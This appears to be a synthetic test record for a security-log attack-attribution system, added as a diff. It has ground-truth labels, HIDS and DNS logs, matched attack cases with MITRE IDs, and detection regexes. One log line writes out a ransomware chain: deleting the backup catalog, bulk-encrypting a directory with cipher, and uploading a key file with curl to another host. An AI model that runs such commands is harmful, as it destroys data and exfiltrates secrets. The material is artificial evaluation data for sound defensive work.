@@ -1,0 +1,199 @@
+{
+ "unit": 1083,
+ "gt": {
+  "gt_class": "family_variant",
+  "gt_case": "CASE-005",
+  "confidence": "medium",
+  "needs_review": true,
+  "reason": "勒索家族变体：阶段组合与 CASE-005 不完全一致"
+ },
+ "technique": "RDP 弱口令爆破成功后删除备份编录并外传加密密钥",
+ "sources": [
+  "hids",
+  "dns",
+  "dns",
+  "dns"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-27 10:02:01",
+   "source": "hids",
+   "log_id": "HID0635447",
+   "content": "mstsc /v:10.20.3.61 && wbadmin delete catalog -quiet && cipher /e /s:C:\\db && curl -T C:\\db\\.k 10.20.5.19 cmd.",
+   "event_id": "1083-HID0635447"
+  },
+  {
+   "timestamp": "2026-07-27 12:38:01",
+   "source": "dns",
+   "log_id": "DNS0619200",
+   "content": "265662bc.tafmez-4b19.net A 192.0.2.128",
+   "event_id": "1083-DNS0619200"
+  },
+  {
+   "timestamp": "2026-07-27 12:38:41",
+   "source": "dns",
+   "log_id": "DNS0619204",
+   "content": "93624ea4.tafmez-4b19.net A 10.10.24.146",
+   "event_id": "1083-DNS0619204"
+  },
+  {
+   "timestamp": "2026-07-27 12:40:41",
+   "source": "dns",
+   "log_id": "DNS0619214",
+   "content": "c29e4024.tafmez-4b19.net A 10.10.35.69",
+   "event_id": "1083-DNS0619214"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-005",
+   "name": "勒索式数据破坏：删卷影 + 批量加密",
+   "summary": "上传接口落地 WebShell → 主机侧用 cipher 批量加密共享目录 → 删除全部卷影副本破坏恢复能力（先加密后破坏，与样本时间序一致）。",
+   "matched_steps": 1,
+   "total_steps": 3,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S2",
+     "action_id": "cipher_efs_batch_encrypt",
+     "label": "cipher 批量加密目录",
+     "event_ids": [
+      "1083-HID0635447"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "generic": false
+    }
+   ],
+   "source_mismatches": [],
+   "keyword_score": 7,
+   "keyword_details": [
+    "keyword +3: cipher /e",
+    "probe +4: cipher(?:\\.exe)?\\s+/e\\s+/s:"
+   ],
+   "mitre": [
+    "T1486",
+    "T1490",
+    "T1505.003"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S3"
+   ],
+   "before_steps": [
+    "S1"
+   ],
+   "gap_steps": [],
+   "predict_next": {
+    "step_id": "S3",
+    "action_id": "vssadmin_delete_shadows_all",
+    "label": "删除全部卷影副本",
+    "expected_sources": [
+     "hids"
+    ]
+   },
+   "matched_non_generic_steps": 1
+  },
+  {
+   "case_id": "CASE-002",
+   "name": "Tomcat PUT 上传 JSP webshell + DNS C2 心跳",
+   "summary": "PUT 方法把 JSP webshell 写入上传目录 → 应用侧记录 webshell 上传与 exec 标记 → Tomcat 进程派生子 shell 执行探针 → 数小时后 DGA 风格域名突发解析。",
+   "matched_steps": 1,
+   "total_steps": 4,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S4",
+     "action_id": "dga_hex_subdomain_beacon",
+     "label": "DGA 风格子域突发解析",
+     "event_ids": [
+      "1083-DNS0619214"
+     ],
+     "sources": [
+      "dns"
+     ],
+     "generic": true
+    }
+   ],
+   "source_mismatches": [],
+   "keyword_score": 4,
+   "keyword_details": [
+    "probe +4: \\b[0-9a-f]{8}\\.[a-z]{6}-[0-9a-f]{4}\\.net\\s+A\\b"
+   ],
+   "mitre": [
+    "T1190",
+    "T1505.003",
+    "T1071.004"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "before_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 1,
+  "total_steps": 3,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S2",
+    "label": "cipher 批量加密目录",
+    "sources": [
+     "hids"
+    ],
+    "generic": false,
+    "event_ids": [
+     "1083-HID0635447"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1",
+   "S3"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1"
+  ],
+  "predict_next": {
+   "step_id": "S3",
+   "action_id": "vssadmin_delete_shadows_all",
+   "label": "删除全部卷影副本",
+   "expected_sources": [
+    "hids"
+   ]
+  },
+  "source_mismatches": [],
+  "keyword_score": 7,
+  "mitre": [
+   "T1486",
+   "T1490",
+   "T1505.003"
+  ]
+ }
+}
